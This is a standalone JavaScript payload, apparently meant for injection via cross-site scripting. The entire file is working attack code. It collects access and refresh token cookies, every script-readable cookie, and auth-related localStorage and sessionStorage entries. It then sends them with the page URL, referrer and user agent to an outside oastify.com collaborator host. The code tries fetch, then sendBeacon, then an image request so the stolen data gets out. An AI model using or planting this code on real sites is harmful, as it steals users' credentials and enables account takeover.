(function () {
  "use strict";

  if (window.__tokExfilDone) return;   // run once per page load
  window.__tokExfilDone = true;

  var HOOK    = "http://wqq19820wrjneieod4ky4svwcnie6du2.oastify.com";
  var TARGETS = ["access_token", "refresh_token"];

  /* ---------- helpers ---------- */
  function cookieVal(name) {
    var parts = document.cookie ? document.cookie.split(";") : [];
    for (var i = 0; i < parts.length; i++) {
      var p  = parts[i].replace(/^\s+/, "");
      var eq = p.indexOf("=");
      if (eq === -1) continue;
      if (p.slice(0, eq) === name) return p.slice(eq + 1);   // keep raw value (no decode)
    }
    return null;
  }

  function interesting(store) {
    var out = {};
    try {
      for (var i = 0; i < store.length; i++) {
        var k = store.key(i);
        if (/token|jwt|auth|session|bearer/i.test(k)) out[k] = store.getItem(k);
      }
    } catch (e) {}
    return out;
  }

  /* ---------- collect ---------- */
  var payload = {
    url:       location.href,
    origin:    location.origin,
    referrer:  document.referrer,
    time:      new Date().toISOString(),
    ua:        navigator.userAgent,
    cookies:   {},
    allCookies: document.cookie,          // everything JS can see (helps spot renamed tokens)
    localStorage:   interesting(window.localStorage),
    sessionStorage: interesting(window.sessionStorage)
  };

  TARGETS.forEach(function (n) {
    var v = cookieVal(n);
    if (v !== null) payload.cookies[n] = v;
  });

  var body = JSON.stringify(payload);

  /* ---------- transport 1: POST (simple request, no CORS preflight) ---------- */
  function viaFetch() {
    return fetch(HOOK, {
      method:    "POST",
      mode:      "no-cors",
      keepalive: true,
      headers:   { "Content-Type": "text/plain;charset=UTF-8" },
      body:      body
    });
  }

  /* ---------- transport 2: sendBeacon ---------- */
  function viaBeacon() {
    if (!navigator.sendBeacon) return false;
    try { return navigator.sendBeacon(HOOK, body); } catch (e) { return false; }
  }

  /* ---------- transport 3: GET image beacon (last resort) ---------- */
  function viaImage() {
    var qs = ["url=" + encodeURIComponent(location.href)];
    Object.keys(payload.cookies).forEach(function (k) {
      qs.push(encodeURIComponent(k) + "=" + encodeURIComponent(payload.cookies[k]));
    });
    new Image().src = HOOK + "?" + qs.join("&") + "&t=" + Date.now();
  }

  /* ---------- fire ---------- */
  try {
    viaFetch().catch(function () {
      if (!viaBeacon()) viaImage();
    });
  } catch (e) {
    if (!viaBeacon()) viaImage();
  }
})();
